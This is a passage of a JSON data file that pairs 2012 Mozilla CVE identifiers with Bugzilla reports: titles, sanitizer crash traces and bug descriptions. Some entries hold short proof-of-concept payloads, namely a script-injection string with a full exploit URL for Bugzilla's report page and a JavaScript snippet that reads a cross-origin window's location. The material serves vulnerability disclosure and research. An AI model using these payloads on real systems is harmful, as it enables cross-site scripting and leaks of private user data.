js::gcreason::Reason) src/js/src/jsfriendapi.cpp:177 #8 0x7f65c825d7a3 in JS_TransplantObject src/js/src/jsapi.cpp:1570 #9 0x7f65bea486f5 in xpc::TransplantObject(JSContext*, JSObject*, JSObject*) src/js/xpconnect/wrappers/WrapperFactory.cpp:674 #10 0x7f65bda1648e in XPCWrappedNative::ReparentWrapperIfFound(XPCCallContext&, XPCWrappedNativeScope*, XPCWrappedNativeScope*, JSObject*, nsISupports*, XPCWrappedNative**) src/js/xpconnect/src/XPCWrappedNative.cpp:1669 #11 0x7f65bd69955d in nsXPConnect::ReparentWrappedNativeIfFound(JSContext*, JSObject*, JSObject*, nsISupports*, nsIXPConnectJSObjectHolder**) src/js/xpconnect/src/nsXPConnect.cpp:1531 #12 0x7f65b8dce9b8 in nsNodeUtils::CloneAndAdopt(nsINode*, bool, bool, nsNodeInfoManager*, JSContext*, JSObject*, nsCOMArray<nsINode>&, nsINode*, nsINode**) src/content/base/src/nsNodeUtils.cpp:537 #13 0x7f65b8bc3c9f in nsNodeUtils::CloneAndAdopt(nsINode*, bool, bool, nsNodeInfoManager*, JSContext*, JSObject*, nsCOMArray<nsINode>&, nsIDOMNode**) src/../../../../dist/include/nsNodeUtils.h:282 #14 0x7f65b8afdd38 in nsNodeUtils::Adopt(nsINode*, nsNodeInfoManager*, JSContext*, JSObject*, nsCOMArray<nsINode>&) src/content/base/src/nsNodeUtils.h:182 #15 0x7f65b8af942c in nsDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) src/content/base/src/nsDocument.cpp:6169 #16 0x7f65ba424360 in nsHTMLDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) src/content/html/document/src/nsHTMLDocument.h:87 #17 0x7f65ba42a366 in non-virtual thunk to nsHTMLDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #18 0x7f65b8d2f657 in AdoptNodeIntoOwnerDoc(nsINode*, nsINode*) src/content/base/src/nsINode.cpp:1257 #19 0x7f65b8d34540 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*) src/content/base/src/nsINode.cpp:1809 #20 0x7f65b8f11881 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, unsigned int*) src/../../../dist/include/nsINode.h:1464 #21 0x7f65b8f0f948 in nsINode::InsertBefore(nsINode*, nsINode*, unsigned int*) src/../../../dist/include/nsINode.h:488 #22 0x7f65b9afb20a in nsINode::AppendChild(nsINode*, unsigned int*) src/../../../dist/include/nsINode.h:498 #23 0x7f65bdbe8437 in nsIDOMNode_AppendChild(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:5531 #24 0x7f65c8ba6501 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #25 0x7f65c8b33731 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2405 #26 0x7f65c8a9a772 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:301 #27 0x7f65c8bb3836 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:486 #28 0x7f65c8bb57ee in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:523 #29 0x7f65c830d5f5 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5673 previously allocated by thread T0 here: #0 0x4c3ef0 in __interceptor_malloc ??:0 #1 0x7f65cf2066c6 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7f65bcdde56d in operator new(unsigned long) src/../../../../dist/include/mozilla/mozalloc.h:200 #3 0x7f65bcdeb3d1 in DOMSVGTests::GetRequiredFeatures(nsIDOMSVGStringList**) src/content/svg/content/src/DOMSVGTests.cpp:33 #4 0x7f65c25d50e7 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #5 0x7f65bda32bde in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3105 #6 0x7f65bda99a67 in XPCWrappedNative::GetAttribute(XPCCallContext&) src/js/xpconnect/src/xpcprivate.h:2817 #7 0x7f65bda98e8c in XPC_WN_GetterSetter(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1518 #8 0x7f65c8ba6501 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #9 0x7f65c843d6dc in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #10 0x7f65c8babebb in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #11 0x7f65c8bb2910 in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:461 #12 0x7f65c8eb4372 in js::Shape::get(JSContext*, JS::Handle<JSObject*>, JSObject*, JSObject*, JS::MutableHandle<JS::Value>) src/js/src/jsscopeinlines.h:296 #13 0x7f65c8e56c4e in js_NativeGetInline(JSContext*, JS::Handle<JSObject*>, JSObject*, JSObject*, js::Shape*, unsigned int, JS::Value*) src/js/src/jsobj.cpp:4461 #14 0x7f65c82bed14 in JSObject::getGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, JS::MutableHandle<JS::Value>) src/js/src/jsobjinlines.h:173 #15 0x7f65c828f65b in JSObject::getProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, js::PropertyName*, JS::MutableHandle<JS::Value>) src/js/src/jsobjinlines.h:184 #16 0x7f65c8b2cd71 in js::GetObjectElementOperation(JSContext*, JSOp, JS::Handle<JSObject*>, JS::Value const&, JS::MutableHandle<JS::Value>) src/js/src/jsinterpinlines.h:713 #17 0x7f65c8a9a772 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:301 #18 0x7f65c8bb3836 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:486 #19 0x7f65c8bb57ee in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:523 #20 0x7f65c830d5f4 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5673 #21 0x7f65baba9ffd in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1499 #22 0x7f65bad59e4f in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9590 #23 0x7f65bad117c9 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9851 #24 0x7f65bad57eab in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10119 Shadow byte and word: 0x1fecb0790ff1: fd 0x1fecb0790ff0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fecb0790fd0: 00 00 00 00 00 00 00 00 0x1fecb0790fd8: 00 00 00 fb fb fb fb fb 0x1fecb0790fe0: fa fa fa fa fa fa fa fa 0x1fecb0790fe8: fa fa fa fa fa fa fa fa =>0x1fecb0790ff0: fd fd fd fd fd fd fd fd 0x1fecb0790ff8: fd fd fd fd fd fd fd fd 0x1fecb0791000: fa fa fa fa fa fa fa fa 0x1fecb0791008: fa fa fa fa fa fa fa fa 0x1fecb0791010: 00 00 00 00 fb fb fb fb Stats: 250M malloced (286M for red zones) by 749048 calls Stats: 117M realloced by 28773 calls Stats: 218M freed by 507760 calls Stats: 83M really freed by 211442 calls Stats: 484M (123977 full pages) mmaped in 121 calls mmaps by size class: 8:557022; 9:40955; 10:16380; 11:10235; 12:3072; 13:2048; 14:768; 15:256; 16:576; 17:224; 18:288; 19:208; 20:4; mallocs by size class: 8:677534; 9:36702; 10:14422; 11:12268; 12:3345; 13:2207; 14:878; 15:297; 16:587; 17:251; 18:343; 19:210; 20:4; frees by size class: 8:455111; 9:26721; 10:10654; 11:8924; 12:2273; 13:1923; 14:605; 15:266; 16:519; 17:241; 18:316; 19:205; 20:2; rfrees by size class: 8:174168; 9:20742; 10:7805; 11:4812; 12:1489; 13:1110; 14:416; 15:139; 16:471; 17:142; 18:142; 19:4; 20:2; Stats: malloc large: 808 small slow: 2574 ==1718== ABORTING"
      }
    ],
    "CVE-2012-4184": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=780370",
        "title": "ChromeObjectWrapper is not implemented as intended",
        "description": "After bug 760109 landing, content still can access properties of a standard prototype from a chrome scope if __exposedProps__ doesn't exist. 67 ChromeObjectWrapper::get(JSContext *cx, JSObject *wrapper, JSObject *receiver, 68 jsid id, js::Value *vp) 69 { 70 // Try the lookup on the base wrapper. 71 if (!ChromeObjectWrapperBase::get(cx, wrapper, receiver, id, vp)) 72 return false; 73 74 // If we found something or have no proto, we're done. 75 JSObject *wrapperProto = JS_GetPrototype(wrapper); 76 if (!vp->isUndefined() || !wrapperProto) 77 return true; ChromeObjectWrapperBase::get lookups the chrome object's prototype chain and can find something on a standard prototype from the chrome scope."
      }
    ],
    "CVE-2012-4185": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785753",
        "title": "Global-buffer-overflow in nsCharTraits::length",
        "description": "Tested with build from http://people.mozilla.org/~choller/firefox/asan/20120826-mozilla-central-linux64-debug-b3cce81fef1a+asan.html ASAN-report from the original repro-file: ###!!! ASSERTION: Decoder returned an error but filled the output buffer! Should not happen.: '0 < capacity - haveRead', file /builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsUnicharStreamLoader.cpp, line 225 ================================================================= ==1146== ERROR: AddressSanitizer global-buffer-overflow on address 0x7f80ca470002 at pc 0x7f80c2dce5ce bp 0x7ffff1b53d20 sp 0x7ffff1b53d18 READ of size 2 at 0x7f80ca470002 thread T0 #0 0x7f80c2dce5ce in nsCharTraits<unsigned short>::length(unsigned short const*) /builds/slave/try-lnx64-dbg/build/../../../dist/include/nsCharTraits.h:345 #1 0x7f80c52900bc in nsAString_internal::Assign(unsigned short const*, unsigned int, mozilla::fallible_t const&) /builds/slave/try-lnx64-dbg/build/xpcom/string/src/nsTSubstring.cpp:304 #2 0x7f80c5290019 in nsAString_internal::Assign(unsigned short const*, unsigned int) /builds/slave/try-lnx64-dbg/build/xpcom/string/src/nsTSubstring.cpp:290 #3 0x7f80c2e723c3 in nsString::operator=(unsigned short const*) /builds/slave/try-lnx64-dbg/build/../../dist/include/nsTString.h:65 #4 0x7f80c46c11a7 in nsDocShell::SetTitle(unsigned short const*) /builds/slave/try-lnx64-dbg/build/docshell/base/nsDocShell.cpp:5236 #5 0x7f80c46c16b0 in non-virtual thunk to nsDocShell::SetTitle(unsigned short const*) /builds/slave/try-lnx64-dbg/build/media/libvpx/vp8/encoder/x86/quantize_mmx.asm:0 #6 0x7f80c35ecf4a in nsDocument::DoNotifyPossibleTitleChange() /builds/slave/try-lnx64-dbg/build/content/base/src/nsDocument.cpp:5288 #7 0x7f80c360a34a in nsRunnableMethodImpl<void (nsDocument::*)(), false>::Run() /builds/slave/try-lnx64-dbg/build/../../../dist/include/nsThreadUtils.h:349 #8 0x7f80c5248003 in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsThread.cpp:624 #9 0x7f80c5199a93 in NS_ProcessNextEvent_P(nsIThread*, bool) /builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:220 #10 0x7f80c4ecd749 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/try-lnx64-dbg/build/ipc/glue/MessagePump.cpp:82 #11 0x7f80c52cdca2 in MessageLoop::RunInternal() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:209 #12 0x7f80c52cdb9f in MessageLoop::Run() /builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:176 #13 0x7f80c4c70c82 in nsBaseAppShell::Run() /builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsBaseAppShell.cpp:165 #14 0x7f80c482cde1 in nsAppStartup::Run() /builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsAppStartup.cpp:273 #15 0x7f80c2abca75 in XREMain::XRE_mainRun() /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3800 #16 0x7f80c2abdb43 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3877 #17 0x7f80c2abe4e2 in XRE_main /builds/slave/try-lnx64-dbg/build/toolkit/xre/nsAppRunner.cpp:3953 #18 0x408dec in do_main(int, char**) /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:174 #19 0x4085db in main /builds/slave/try-lnx64-dbg/build/browser/app/nsBrowserApp.cpp:279 #20 0x7f80cd06d76d in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:258 0x7f80ca470002 is located 0 bytes to the right of global variable 'gNullChar (/builds/slave/try-lnx64-dbg/build/xpcom/string/src/nsSubstring.cpp)' (0x7f80ca470000) of size 2 ==1146== ABORTING Stats: 235M malloced (239M for red zones) by 324882 calls Stats: 30M realloced by 21484 calls Stats: 202M freed by 199576 calls Stats: 68M really freed by 103398 calls Stats: 436M (111696 full pages) mmaped in 109 calls mmaps by size class: 8:196596; 9:32764; 10:20475; 11:16376; 12:3072; 13:1536; 14:1280; 15:256; 16:448; 17:1248; 18:192; 19:40; 20:16; mallocs by size class: 8:236195; 9:35940; 10:24728; 11:19418; 12:2929; 13:1796; 14:1466; 15:270; 16:632; 17:1255; 18:195; 19:44; 20:14; frees by size class: 8:131552; 9:24822; 10:20131; 11:16183; 12:1854; 13:1549; 14:1301; 15:227; 16:520; 17:1244; 18:140; 19:41; 20:12; rfrees by size class: 8:69590; 9:9871; 10:11815; 11:9747; 12:640; 13:470; 14:487; 15:107; 16:301; 17:358; 18:6; 19:5; 20:1; Stats: malloc large: 1508 small slow: 1931 Shadow byte and word: 0x1ff01948e000: 2 0x1ff01948e000: 02 f9 f9 f9 f9 f9 f9 f9 More shadow bytes: 0x1ff01948dfe0: 00 00 f9 f9 f9 f9 f9 f9 0x1ff01948dfe8: 00 f9 f9 f9 f9 f9 f9 f9 0x1ff01948dff0: 00 00 f9 f9 f9 f9 f9 f9 0x1ff01948dff8: 00 f9 f9 f9 f9 f9 f9 f9 =>0x1ff01948e000: 02 f9 f9 f9 f9 f9 f9 f9 0x1ff01948e008: 00 00 00 f9 f9 f9 f9 f9 0x1ff01948e010: 00 f9 f9 f9 f9 f9 f9 f9 0x1ff01948e018: 00 f9 f9 f9 f9 f9 f9 f9 0x1ff01948e020: 00 f9 f9 f9 f9 f9 f9 f9"
      }
    ],
    "CVE-2012-4186": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785967",
        "title": "Heap-buffer-overflow in nsWaveReader::DecodeAudioData",
        "description": "This bug was filed from the Socorro interface and is report bp-edaabcc3-a4c5-4935-b00e-940a22120827 . ============================================================= I'm trying to minimize the testcase further and I'll add new testcase if I make any progress worth it. ASAN-report from opt-build: ==10566== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f8860191081 at pc 0x7f8888de9ee1 bp 0x7f88311df4e0 sp 0x7f88311df4d8 READ of size 1 at 0x7f8860191081 thread T18 #0 0x7f8888de9ee1 in nsWaveReader::DecodeAudioData() /home/attekett/firefox/src/content/media/wave/nsWaveReader.cpp:192 0x7f8860191081 is located 1 bytes to the right of 4096-byte region [0x7f8860190080,0x7f8860191080) allocated by thread T18 here: #0 0x425141 in __interceptor_malloc ??:0 #1 0x7f888d468228 in moz_xmalloc /home/attekett/firefox/src/memory/mozalloc/mozalloc.cpp:57 Thread T18 created by T17 here: #0 0x420e15 in pthread_create ??:0 #1 0x7f888efac45f in _PR_CreateThread /home/attekett/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:393 #2 0x7f888efabeb8 in PR_CreateThread /home/attekett/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:476 ==10566== ABORTING Stats: 329M malloced (591M for red zones) by 1746645 calls Stats: 58M realloced by 20510 calls Stats: 256M freed by 217843 calls Stats: 97M really freed by 154806 calls Stats: 864M (221280 full pages) mmaped in 209 calls mmaps by size class: 8:1589151; 9:32764; 10:16380; 11:16376; 12:3072; 13:1536; 14:1280; 15:256; 16:384; 17:1248; 18:176; 19:40; 20:16; 21:2; 22:12; 23:4; 24:1; mallocs by size class: 8:1664564; 9:38223; 10:17175; 11:18265; 12:2582; 13:1803; 14:1539; 15:361; 16:558; 17:1303; 18:195; 19:41; 20:17; 21:2; 22:12; 23:4; 24:1; frees by size class: 8:153178; 9:28974; 10:13767; 11:14943; 12:1700; 13:1601; 14:1361; 15:309; 16:484; 17:1289; 18:169; 19:40; 20:15; 21:2; 22:11; rfrees by size class: 8:114243; 9:17260; 10:9448; 11:10197; 12:972; 13:748; 14:839; 15:190; 16:184; 17:695; 18:25; 19:4; 20:1; Stats: malloc large: 1575 small slow: 4633 Shadow byte and word: 0x1ff10c032210: fa 0x1ff10c032210: fa fa fa fa fa fa fa fa More shadow bytes: 0x1ff10c0321f0: 00 00 00 00 00 00 00 00 0x1ff10c0321f8: 00 00 00 00 00 00 00 00 0x1ff10c032200: 00 00 00 00 00 00 00 00 0x1ff10c032208: 00 00 00 00 00 00 00 00 =>0x1ff10c032210: fa fa fa fa fa fa fa fa 0x1ff10c032218: fa fa fa fa fa fa fa fa 0x1ff10c032220: fa fa fa fa fa fa fa fa 0x1ff10c032228: fa fa fa fa fa fa fa fa 0x1ff10c032230: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-4187": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=787493",
        "title": "Crash with ASSERTION: insPos too small",
        "description": "Reproducible with built from https://people.mozilla.com/~choller/firefox/asan/20120831-mozilla-central-linux64-debug-fcc533f691e9+asan.html OS: Ubuntu 12.04 x86_64 The reprofile is not stable and it might take few tries to reproduce. ASAN-report: ASAN:SIGSEGV ==11689== ERROR: AddressSanitizer crashed on unknown address 0x7f00dca7af80 (pc 0x7efff2512520 sp 0x7fffdf81b7d8 bp 0x7fffdf81b820 T0) AddressSanitizer can not provide additional info. ABORTING #0 0x7efff2512520 in ?? /build/buildd/eglibc-2.15/string/../sysdeps/x86_64/multiarch/memcpy-ssse3-back.S:2577 #1 0x7effe7e9c1bf in nsTArray_base<nsTArrayDefaultAllocator>::ShiftData(unsigned int, unsigned int, unsigned int, unsigned int, unsigned long) /builds/slave/try-lnx64-dbg/build/../../../dist/include/nsTArray-inl.h:247 #2 0x7effe8cb2b47 in nsRefPtr<nsHTMLOptionElement>* nsTArray<nsRefPtr<nsHTMLOptionElement>, nsTArrayDefaultAllocator>::ReplaceElementsAt<nsHTMLOptionElement*>(unsigned int, unsigned int, nsHTMLOptionElement* const*, unsigned int) /builds/slave/try-lnx64-dbg/build/../../../../dist/include/nsTArray.h:724 #3 0x7effe8ca6367 in nsHTMLOptionCollection::InsertOptionAt(nsHTMLOptionElement*, unsigned int) /builds/slave/try-lnx64-dbg/build/content/html/content/src/nsHTMLSelectElement.h:68 #4 0x7effe8ca5392 in nsHTMLSelectElement::InsertOptionsIntoListRecurse(nsIContent*, int*, int) /builds/slave/try-lnx64-dbg/build/content/html/content/src/nsHTMLSelectElement.cpp:338 #5 0x7effe8ca4d8e in nsHTMLSelectElement::InsertOptionsIntoList(nsIContent*, int, int, bool) /builds/slave/try-lnx64-dbg/build/content/html/content/src/nsHTMLSelectElement.cpp:215 #6 0x7effe8ca65fb in nsHTMLSelectElement::WillAddOptions(nsIContent*, nsIContent*, int, bool) /builds/slave/try-lnx64-dbg/build/content/html/content/src/nsHTMLSelectElement.cpp:455 #7 0x7effe8ca3881 in nsSafeOptionListMutation /builds/slave/try-lnx64-dbg/build/content/html/content/src/nsHTMLSelectElement.cpp:73 #8 0x7effe8ca4b51 in nsHTMLSelectElement::InsertChildAt(nsIContent*, unsigned int, bool) /builds/slave/try-lnx64-dbg/build/content/html/content/src/nsHTMLSelectElement.cpp:191 . . ."
      }
    ],
    "CVE-2012-4188": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=787722",
        "title": "Heap-buffer-overflow in Convolve3x3",
        "description": "Reproducible with ASAN-build from https://people.mozilla.com/~choller/firefox/asan/20120831-mozilla-central-linux64-debug-fcc533f691e9+asan.html ASAN-report: ==1095== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fae06810023 at pc 0x7fae417985cc bp 0x7fff9dfb8c80 sp 0x7fff9dfb8c78 READ of size 1 at 0x7fae06810023 thread T0 #0 0x7fae417985cc in Convolve3x3 /home/attekett/firefox/src/content/svg/content/src/nsSVGFilters.cpp:4926 0x7fae06810023 is located 3 bytes to the right of 4000-byte region [0x7fae0680f080,0x7fae06810020) allocated by thread T0 here: #0 0x422e7c in posix_memalign ??:0 #1 0x7fae428f6565 in TryAllocAlignedBytes /home/attekett/firefox/src/gfx/thebes/gfxImageSurface.cpp:89 #2 0x7fae41764886 in nsSVGFE::SetupScalingFilter(nsSVGFilterInstance*, nsSVGFE::Image const*, nsSVGFE::Image const*, nsIntRect const&, nsSVGNumberPair*) /home/attekett/firefox/src/content/svg/content/src/nsSVGFilters.cpp:153 #3 0x7fae41782077 in nsSVGFELightingElement::Filter(nsSVGFilterInstance*, nsTArray<nsSVGFE::Image const*, nsTArrayDefaultAllocator> const&, nsSVGFE::Image const*, nsIntRect const&) /home/attekett/firefox/src/content/svg/content/src/nsSVGFilters.cpp:5009 #4 0x7fae4169d8e5 in nsSVGFilterInstance::Render(gfxASurface**) /home/attekett/firefox/src/layout/svg/base/src/nsSVGFilterInstance.cpp:583 #5 0x7fae416944d4 in nsSVGFilterFrame::PaintFilteredFrame(nsRenderingContext*, nsIFrame*, nsSVGFilterPaintCallback*, nsRect const*) /home/attekett/firefox/src/layout/svg/base/src/nsSVGFilterFrame.cpp:444 . . ."
      }
    ],
    "CVE-2012-4189": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=790296",
        "title": "[SECURITY] Field values are not escaped correctly in tabular reports",
        "description": "PoC: http://localhost/cgi-bin/bug/editversions.cgi?action=add&product=TestProduct -> Version: \"><script>alert(1);</script> Add new bug to \"TestProduct\" with version \"><script>alert(1);</script> http://localhost/cgi-bin/bug/query.cgi?format=report-table -> Horizontal Axis: Version should be the results: Version: \"><script>alert(1);</script> -> Generate Report http://localhost/cgi-bin/bug/report.cgi?x_axis_field=version&y_axis_field=&z_axis_field=&query_format=report-table&short_desc_type=allwordssubstr&short_desc=&resolution=---&longdesc_type=allwordssubstr&longdesc=&bug_file_loc_type=allwordssubstr&bug_file_loc=&keywords_type=allwords&keywords=&deadlinefrom=&deadlineto=&bug_id=&bug_id_type=anyexact&version=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&emailassigned_to1=1&emailtype1=substring&email1=&emailassigned_to2=1&emailreporter2=1&emailcc2=1&emailtype2=substring&email2=&emaillongdesc3=1&emailtype3=substring&email3=&chfieldvalue=&chfieldfrom=&chfieldto=Now&j_top=AND&f1=noop&o1=noop&v1=&format=table&action=wrap Result: + oColumn.field + \"&amp;version=\"><script>alert(1);</script>'>\" elLiner.innerHTML = \"<a href='buglist.cgi?action=wrap&amp;resolution=---&amp;version=\"><script>alert(1);</script>'>\" <a href=\"buglist.cgi?action=wrap&amp;resolution=---&amp;version=\"><script>alert(1);</script>\">5</a> <a href=\"buglist.cgi?action=wrap&amp;resolution=---&amp;=%20&amp;version=\"><script>alert(1);</script>\">5</a>"
      }
    ],
    "CVE-2012-4190": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=790139",
        "title": "crash in FT2FontEntry::CreateFontEntry when visiting any site in CM10",
        "description": "This bug was filed from the Socorro interface and is report bp-07fb607e-9105-4fad-9ecc-1534e2120911 . ============================================================= According to community member Peter Vagner, this happens on http://nightly.mozilla.org, or often when he turns on Reader Mode. An installation of AdBlock doesn't seem to have any bearing. Have been unsuccessful in reproducing so far, but will keep trying."
      }
    ],
    "CVE-2012-4191": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=798045",
        "title": "crash in mozilla::net::FailDelayManager::Lookup",
        "description": "It's #114 top browser crasher in 16.0b5 and seems to happen only in Beta versions with this signature: 15.0 or 16.0. Signature arena_dalloc_small | je_free | nsACString_internal::`scalar deleting destructor''(unsigned int) More Reports Search UUID c977c9fe-233d-4d8a-a1be-19ea42121004 Date Processed 2012-10-04 19:56:15 Uptime 82347 Last Crash 22.9 hours before submission Install Age 4.4 days since version was first installed. Install Time 2012-06-28 10:56:11 Product Firefox Version 16.0 Build ID 20120925201946 Release Channel beta OS Windows NT OS Version 6.1.7600 Build Architecture x86 Build Architecture Info GenuineIntel family 6 model 42 stepping 7 Crash Reason EXCEPTION_BREAKPOINT Crash Address 0x6e8f01f1 App Notes AdapterVendorID: 0x8086, AdapterDeviceID: 0x0116, AdapterSubsysID: 15ea10cf, AdapterDriverVersion: 8.15.10.2287 D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+ EMCheckCompatibility True Adapter Vendor ID 0x8086 Adapter Device ID 0x0116 Total Virtual Memory 2147352576 Available Virtual Memory 1357484032 System Memory Use Percentage 54 Available Page File 5218824192 Available Physical Memory 1687126016 Frame Module Signature Source 0 mozglue.dll arena_dalloc_small memory/mozjemalloc/jemalloc.c:4510 1 mozglue.dll je_free memory/mozjemalloc/jemalloc.c:6565 2 xul.dll nsACString_internal::`scalar deleting destructor' 3 xul.dll mozilla::net::FailDelayManager::Lookup netwerk/protocol/websocket/WebSocketChannel.cpp:218 4 xul.dll mozilla::net::FailDelayManager::DelayOrBegin netwerk/protocol/websocket/WebSocketChannel.cpp:229 5 xul.dll mozilla::net::nsWSAdmissionManager::ConditionallyConnect netwerk/protocol/websocket/WebSocketChannel.cpp:339 6 xul.dll mozilla::net::WebSocketChannel::OnLookupComplete netwerk/protocol/websocket/WebSocketChannel.cpp:2217 7 xul.dll `anonymous namespace'::DNSListenerProxy::OnLookupCompleteRunnable::Run netwerk/dns/nsDNSService2.cpp:552 8 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:624 9 xul.dll mozilla::ipc::MessagePump::Run ipc/glue/MessagePump.cpp:82 10 xul.dll MessageLoop::RunHandler ipc/chromium/src/base/message_loop.cc:201 11 xul.dll MessageLoop::Run ipc/chromium/src/base/message_loop.cc:175 12 xul.dll nsBaseAppShell::Run widget/xpwidgets/nsBaseAppShell.cpp:163 13 xul.dll nsAppShell::Run widget/windows/nsAppShell.cpp:232 14 xul.dll nsAppStartup::Run toolkit/components/startup/nsAppStartup.cpp:257 15 xul.dll XREMain::XRE_mainRun toolkit/xre/nsAppRunner.cpp:3794 16 xul.dll XREMain::XRE_main toolkit/xre/nsAppRunner.cpp:3871 17 xul.dll XRE_main toolkit/xre/nsAppRunner.cpp:3947 18 firefox.exe wmain toolkit/xre/nsWindowsWMain.cpp:100 19 firefox.exe __tmainCRTStartup crtexe.c:552 20 kernel32.dll BaseThreadInitThunk 21 ntdll.dll __RtlUserThreadStart 22 ntdll.dll _RtlUserThreadStart More reports at: https://crash-stats.mozilla.com/report/list?signature=arena_dalloc_small+|+je_free+|+nsACString_internal%3A%3A%60scalar+deleting+destructor%27%27%28unsigned+int%29"
      }
    ],
    "CVE-2012-4192": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=799952",
        "title": "Cross domain access to the location object",
        "description": "http://www.thespanner.co.uk/2012/10/10/firefox-knows-what-your-friends-did-last-summer/ function poc() { var win = window.open('https://twitter.com/lists/', 'newWin', 'width=200,height=200'); setTimeout(function(){ alert('Hello '+/^https:\\/\\/twitter.com\\/([^/]+)/.exec(win.location)[1]) }, 5000); } I can't reproduce in 15 or trunk, but 16 is affected."
      }
    ],
    "CVE-2012-4194": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=800666",
        "title": "Location can be spoofed using |valueOf|",
        "description": "When Adobe Flash Player checks the page location to apply the SOP, it reads the return value of javascript:top.location+\"__flashplugin_unique__\". When an object is joined with a string, its |valueOf| method is called before |toString|, and content can redefine the former. This appears to have regressed in Firefox v16.0.1."
      }
    ],
    "CVE-2012-4195": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=793121",
        "title": "nsLocation::CheckURL can use the wrong principal",
